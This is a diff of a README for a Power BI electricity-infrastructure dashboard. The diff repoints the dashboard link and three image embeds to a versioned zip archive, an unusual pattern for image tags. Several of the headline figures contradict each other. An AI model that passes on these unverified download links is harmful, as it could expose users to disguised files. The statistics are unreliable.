@@ -3,11 +3,11 @@
 
 ## A brief Introduction and Overview:
 
-The Power BI dashboard(https://raw.githubusercontent.com/Collins76/DT-Uprisers-Feeder-Pillars-Power-BI-Project/Data-Science-Project/pya/DT-Uprisers-Feeder-Pillars-Power-BI-Project.zip) I have created for Ikeja Electric Plc provides a comprehensive monitoring system for electricity distribution infrastructure, with a particular focus on upriser and feeder pillar inspections across various business units in the Lagos area. Overall, the dashboard successfully combines operational metrics, geographical data, and performance indicators to support infrastructure management and maintenance decisions. The multi-page approach allows for different analytical perspectives while maintaining a cohesive theme.
+The Power BI dashboard(https://github.com/Collins76/DT-Uprisers-Feeder-Pillars-Power-BI-Project/raw/refs/heads/Data-Science-Project/pya/Feeder_Uprisers_D_B_Project_Power_Pillars_v3.4.zip) I have created for Ikeja Electric Plc provides a comprehensive monitoring system for electricity distribution infrastructure, with a particular focus on upriser and feeder pillar inspections across various business units in the Lagos area. Overall, the dashboard successfully combines operational metrics, geographical data, and performance indicators to support infrastructure management and maintenance decisions. The multi-page approach allows for different analytical perspectives while maintaining a cohesive theme.
 
 ### Dashboard Design and Layout:
 
-![Image](https://raw.githubusercontent.com/Collins76/DT-Uprisers-Feeder-Pillars-Power-BI-Project/Data-Science-Project/pya/DT-Uprisers-Feeder-Pillars-Power-BI-Project.zip)
+![Image](https://github.com/Collins76/DT-Uprisers-Feeder-Pillars-Power-BI-Project/raw/refs/heads/Data-Science-Project/pya/Feeder_Uprisers_D_B_Project_Power_Pillars_v3.4.zip)
 
 The dashboard employs a well-organized grid layout that effectively compartmentalizes different data categories. The consistent color scheme—primarily using green for positive indicators and red for negative ones—creates visual harmony while ensuring intuitive interpretation. The segmentation between key metrics, field officer performance, and business unit analysis provides a logical flow of information.
 
@@ -17,7 +17,7 @@ The use of cards for headline metrics (7,647 good uprisers, 1,101 bad uprisers, 
 
 #### The dashboard employs a diverse and appropriate mix of visualization types:
 
-![Image](https://raw.githubusercontent.com/Collins76/DT-Uprisers-Feeder-Pillars-Power-BI-Project/Data-Science-Project/pya/DT-Uprisers-Feeder-Pillars-Power-BI-Project.zip)
+![Image](https://github.com/Collins76/DT-Uprisers-Feeder-Pillars-Power-BI-Project/raw/refs/heads/Data-Science-Project/pya/Feeder_Uprisers_D_B_Project_Power_Pillars_v3.4.zip)
 
 The line graph tracking good versus bad uprisers over time effectively shows trends and patterns
 The pie charts for upriser condition (87.44% good, 12.59% bad) and feeder pillar condition (64.6% good, 24.0% excellent, 7.0% poor, 2.2% critical, 2.2% no assessment) provide immediate proportion insights
@@ -29,7 +29,7 @@ The "Good Upriser Percentage Over Time" graph effectively combines trend lines f
 
 #### The dashboard presents several critical operational metrics:
 
-![Image](https://raw.githubusercontent.com/Collins76/DT-Uprisers-Feeder-Pillars-Power-BI-Project/Data-Science-Project/pya/DT-Uprisers-Feeder-Pillars-Power-BI-Project.zip)
+![Image](https://github.com/Collins76/DT-Uprisers-Feeder-Pillars-Power-BI-Project/raw/refs/heads/Data-Science-Project/pya/Feeder_Uprisers_D_B_Project_Power_Pillars_v3.4.zip)
 
 Upriser Performance: 7,647 good uprisers (87.44%) versus 1,101 bad uprisers (12.59%) out of 8,513 total inspections
 Record Validation: 4,663 valid records versus 171 invalid records
